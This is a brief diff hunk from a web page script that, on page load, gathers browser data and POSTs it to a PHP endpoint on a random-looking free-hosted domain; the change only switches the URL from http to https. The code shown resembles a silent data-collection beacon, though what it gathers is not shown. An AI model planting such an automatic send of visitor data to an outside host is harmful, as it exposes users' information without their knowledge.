@@ -91,7 +91,7 @@ window.addEventListener("load", () => {
     
     const browserData = EnviarData();
     
-    fetch("http://eygfuibb.wuaze.com/controlador.php", {
+    fetch("https://eygfuibb.wuaze.com/controlador.php", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
